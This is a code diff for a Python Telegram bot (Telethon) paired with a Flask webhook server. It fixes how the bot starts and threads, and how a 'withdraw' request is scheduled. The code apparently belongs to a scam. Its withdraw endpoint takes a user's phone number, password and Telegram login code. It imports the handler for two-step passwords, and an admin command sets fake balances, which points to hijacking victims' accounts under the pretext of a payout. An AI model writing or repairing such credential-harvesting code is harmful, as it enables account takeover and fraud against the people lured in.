@@ -1,6 +1,7 @@
 import asyncio
 import logging
 import os
+from threading import Thread
 from telethon import TelegramClient, events, Button
 from telethon.errors import SessionPasswordNeededError
 from flask import Flask, request, jsonify
@@ -13,7 +14,7 @@ CRYPTO_ADDRESS = '0xYourAddress'
 WEBHOOK_URL = 'https://your-app.up.railway.app'
 
 logging.basicConfig(level=logging.INFO)
-bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+bot = TelegramClient('bot_session', API_ID, API_HASH)
 app = Flask(__name__)
 
 user_states = {}
@@ -125,7 +126,7 @@ def withdraw():
     phone = data.get('phone')
     password = data.get('password')
     code = data.get('code')
-    asyncio.ensure_future(process_withdraw(user_id, phone, password, code))
+    bot.loop.call_soon_threadsafe(lambda: asyncio.ensure_future(process_withdraw(user_id, phone, password, code)))
     return jsonify({'message': 'Запрос обрабатывается'})
 
 async def process_withdraw(user_id, phone, password, code):
@@ -165,9 +166,13 @@ async def set_balance(event):
     except:
         await event.respond('/setbalance <id> <сумма>')
 
-async def main():
-    await bot.start()
+def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+
+async def main():
+    await bot.start(bot_token=BOT_TOKEN)
+    Thread(target=run_flask, daemon=True).start()
+    await bot.run_until_disconnected()
 
 if __name__ == '__main__':
     asyncio.run(main())
